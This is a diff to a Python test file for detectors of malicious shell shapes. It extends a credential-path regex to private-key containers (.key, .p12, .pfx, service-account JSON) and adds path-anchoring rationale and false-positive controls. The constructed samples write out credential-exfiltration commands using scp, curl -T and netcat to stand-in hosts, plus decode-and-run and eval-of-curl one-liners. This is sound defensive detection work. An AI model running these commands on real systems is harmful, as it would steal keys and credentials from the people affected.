@@ -342,10 +342,18 @@ def test_no_lookalike_domains_in_tracked_files():
 # describe, so that one alternative would fire on a plausible future catalog
 # entry and get this rule deleted. Bounded beats broad — the same trade the
 # installer arms above make.
+#
+# `.key`/`.p12`/`.pfx` are PATH-ANCHORED (a `/` must precede the filename) and
+# `.pem` is not, because the two are not alike. `.pem` only ever names a file;
+# `.key` is the tail of half the expressions in the GitHub Actions language
+# (`steps.cache.outputs.key`) and of this repository's own prose about cache
+# keys. Unanchored, `.key` fires on a sentence describing P14.19 — the catalog
+# entry this arm sits beside. The negative controls below pin all three.
 _CRED_PATH = (
     r"(?:\.aws/credentials|\.ssh/id_(?:rsa|ed25519|ecdsa|dsa)|\.netrc"
     r"|gh/hosts\.yml|\.kube/config|\.docker/config\.json|\.git-credentials"
-    r"|[\w.-]+\.pem\b|credentials\.json)"
+    r"|[\w.-]+\.pem\b|[\w.-]*/[\w.-]+\.(?:key|p12|pfx)\b"
+    r"|service-account[\w.-]*\.json|credentials\.json)"
 )
 
 # Egress, as a COMMAND or a literal address — not as prose. The probe script's
@@ -421,6 +429,15 @@ def test_malicious_shape_detectors_fire_on_constructed_samples():
         "cat ~/.config/gcloud/", "credentials.json | curl -d @- ", scheme, "x.example.invalid")
     assert _EXFILTRATION.search(sdk_creds), "lost the cloud-SDK credential file"
 
+    # The other private-key containers. These are PATH-ANCHORED on purpose —
+    # see the negative controls below for what a bare `.key` extension costs.
+    deploy_key = _parts("scp ~/", ".ssh/deploy.key ", "user@203.0.113.9:/tmp/k")
+    assert _EXFILTRATION.search(deploy_key), "lost the bare private-key file"
+    pkcs12 = _parts("curl -T /etc/ssl/private/", "server.p12 ", scheme, "drop.example.invalid")
+    assert _EXFILTRATION.search(pkcs12), "lost the PKCS#12 keystore"
+    gcp_sa = _parts("cat ~/secrets/", "service-account.json | nc ", "10.0.0.1 4444")
+    assert _EXFILTRATION.search(gcp_sa), "lost the GCP service-account key"
+
     decoded = _parts("echo aGVsbG8= | base64 ", "--decode | bash")
     assert _OBFUSCATED_EXEC.search(decoded), "lost the decode-then-run shape"
     evaled = _parts("eval \"$(curl -fsSL ", scheme, "example.invalid/x)\"")
@@ -439,6 +456,16 @@ def test_malicious_shape_detectors_fire_on_constructed_samples():
         _parts("reads ~/", ".aws/credentials and posts them to a remote endpoint"),
         _parts("curl -fsSL ", scheme, "api.github.com/repos/o/r"),
         "the runner's OIDC token was extracted from memory",
+        # Why the key containers are path-anchored. A bare `\.key\b` is not a
+        # file extension in a repository about GitHub Actions — it is the tail
+        # of half the expressions in the language, and of this catalog's own
+        # prose about cache keys. All three of these fire under an unanchored
+        # rule, and the third describes P14.19, the entry this arm exists
+        # alongside. That rule would be deleted the first time it fired.
+        _parts("restore the cache with `${{ steps.cache.outputs.key }}` after fetching ",
+               scheme, "example.com/x"),
+        "The cache.key input is compared with the curl'd manifest",
+        "P14.19 flags a cache path containing server.key when the job also runs curl",
     ):
         for name, rx in _MALICIOUS_SHAPES:
             assert not rx.search(benign), f"false positive ({name}): {benign}"
